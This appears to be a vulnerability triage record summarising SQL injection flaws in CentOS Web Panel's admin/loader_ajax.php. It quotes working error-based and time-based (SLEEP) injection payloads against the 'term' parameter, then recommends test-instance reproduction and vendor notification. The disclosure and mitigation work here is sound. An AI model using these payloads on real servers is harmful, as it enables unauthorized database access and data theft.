proposal.summary: The report describes SQL injection vulnerabilities in CentOS Web Panel (v6 - v7) allowing error-based and time-based SQL injection via the 'term' parameter in admin/loader_ajax.php?action=searchIn, demonstrated by payloads that execute SELECT/CONCAT and SLEEP(5).
proposal.cwe_quote:
https://{DOMAIN_NAME}:2031/cwp_{SESSION_HASH}/admin/loader_ajax.php?ajax=dashboard&action=searchIn&term=a'
AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x716b6a7171,(SELECT
(ELT(1197=1197,1))),0x71707a7671,FLOOR(RAND(0)*2))x FROM
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aRuO

A.quote:
Type: Time Based SQL Injection
# Payload:
https://{DOMAIN_NAME}:2031/cwp_{SESSION_HASH}/admin/loader_ajax.php?ajax=dashboard&action=searchIn&term=a'
OR SLEEP(5)-- JCpP

proposal.recommended_next_step: Attempt to reproduce the injection against a test instance to confirm exploitable impact (data extraction, authentication bypass, or remote code execution), identify required authentication/context, and create a minimal safe PoC; then notify vendor with reproduction steps and suggest parameterized queries or prepared statements for mitigation.
